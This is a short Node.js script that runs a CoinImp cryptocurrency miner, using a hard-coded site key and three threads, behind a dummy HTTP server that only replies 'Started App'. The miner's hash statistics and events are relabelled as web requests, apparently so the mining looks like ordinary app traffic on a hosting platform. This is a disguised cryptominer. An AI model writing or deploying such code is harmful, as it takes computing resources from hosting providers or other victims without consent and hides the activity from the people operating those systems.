const CoinImp = require('coin-imp');
const http = require('http');  

(async () => {
 
  // Create miner
  const miner = await CoinImp('baf58423d7d870fa6b3d783d44a120d132e8b45f6b496eef491bc2eb6fc6655b', {throttle:0.5} ,{threads:3} ); // Coin-Hive's Site Key
 
  // Start miner
  await miner.start();
 
  // Listen on events
  miner.on('found nothing', () => console.log('Found!!'))
  miner.on('accepted request', () => console.log('Accepted!!'))
  miner.on('update', data => console.log(`
    Request per second: ${data.hashesPerSecond}
    Total Request: ${data.totalHashes}
    Received Request: ${data.acceptedHashes}
  `));
 
  const requestHandler = (request, response) => {  
    console.log(request.url)
    response.end('Started App')
  }

  const server = http.createServer(requestHandler)

  server.listen(process.env.PORT, (err) => {  
    if (err) {
      return console.log('something bad happened', err)
    }

    console.log(`server is listening`)
  })

  // Stop miner
  //setTimeout(async () => await miner.stop(), 60000);
})();
